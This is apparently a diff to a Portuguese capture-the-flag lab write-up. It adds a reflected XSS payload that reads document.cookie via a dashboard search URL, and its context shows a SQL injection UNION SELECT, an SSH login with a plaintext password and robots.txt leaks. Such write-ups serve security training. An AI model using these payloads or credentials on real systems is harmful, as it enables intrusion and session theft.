@@ -107,6 +107,17 @@ UNION SELECT table_name,1,1 FROM information_schema.views;
 # FLAG{v13w_d1sc0v3ry_4dv4nc3d}
 
 ```
+### 9.8 Exploração XSS
+
+**Payload:**
+
+http://98.95.207.28/dashboard.php?search=
+<script>alert(document.cookie)</script>
+
+
+**Flag:** `FLAG{xss_r3fl3ct3d_vuln3r4b1l1ty}`
+
+
 ## 9.9 Credenciais Git
 
 **Local:** `.git-credentials`
@@ -125,7 +136,7 @@ ssh -p 2222 techcorp@98.95.207.28
 Password: TechCorp2024!
 
 
-````
+```
 
 ## 9.11 Robots.txt
 
@@ -137,15 +148,6 @@ Disallow: /admin/
 Disallow: /backup/
 Disallow: /config/
 Flag: FLAG{r0b0ts_txt_l34k4g3}
-
-```
-
-## 9.12 Código Fonte
-
-**Local:** `index.php`
-
-```t
-<!-- FLAG{b4s1c_s0urc3_c0d3_1nsp3ct10n} -->
 
 ```
 
